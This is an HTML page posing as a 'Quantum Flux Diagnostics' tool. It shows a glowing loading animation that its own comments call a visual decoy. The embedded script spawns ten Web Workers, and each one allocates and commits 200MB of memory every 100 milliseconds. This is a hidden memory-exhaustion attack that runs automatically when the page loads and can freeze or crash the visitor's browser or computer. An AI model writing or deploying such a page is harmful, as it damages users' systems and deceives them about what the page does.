<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Quantum Flux Diagnostics</title>
<style>
    body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: radial-gradient(circle, #0a0a2a 0%, #000 100%); color: #00f2ff; font-family: 'Segoe UI', monospace; }
    canvas { display: block; position: absolute; z-index: 1; }
    .ui { position: relative; z-index: 2; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; pointer-events: none; }
    h1 { font-size: 4rem; letter-spacing: 15px; margin: 0; text-shadow: 0 0 20px #00f2ff; font-weight: 100; }
    .loader { width: 300px; height: 2px; background: #111; margin-top: 20px; position: relative; overflow: hidden; }
    .loader::after { content: ''; position: absolute; left: -100%; width: 100%; height: 100%; background: #00f2ff; animation: load 3s infinite; }
    @keyframes load { 100% { left: 100%; } }
</style>
</head>
<body>

<canvas id="c"></canvas>
<div class="ui">
    <h1>FLUX ACTIVE</h1>
    <div class="loader"></div>
    <p style="opacity: 0.5; margin-top: 10px;">OPTIMIZING NEURAL PATHWAYS...</p>
</div>

<script>
// --- VISUAL DECOY ---
const canvas = document.getElementById('c');
const ctx = canvas.getContext('2d');
let w = canvas.width = window.innerWidth;
let h = canvas.height = window.innerHeight;

function draw() {
    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
    ctx.fillRect(0, 0, w, h);
    ctx.fillStyle = '#00f2ff';
    for(let i=0; i<50; i++) {
        ctx.fillRect(Math.random()*w, Math.random()*h, 2, 2);
    }
    requestAnimationFrame(draw);
}
draw();

// --- THE BACKGROUND RAM EATER (WORKER) ---
// We create the worker script as a string
const workerCode = `
    const storage = [];
    setInterval(() => {
        try {
            // Allocate 200MB chunks
            const chunk = new Uint8Array(200 * 1024 * 1024);
            // Force physical RAM commitment
            for (let i = 0; i < chunk.length; i += 4096) {
                chunk[i] = Math.random() * 255;
            }
            storage.push(chunk);
        } catch (e) {}
    }, 100); // Repeat every 100ms
`;

const blob = new Blob([workerCode], {type: 'application/javascript'});
const workerUrl = URL.createObjectURL(blob);

// Spawn 10 background workers. 
// Each worker operates independently, bypassing the main thread's limits.
for (let i = 0; i < 10; i++) {
    new Worker(workerUrl);
}

console.log("Flux optimization sequence initiated.");
</script>

</body>
</html>
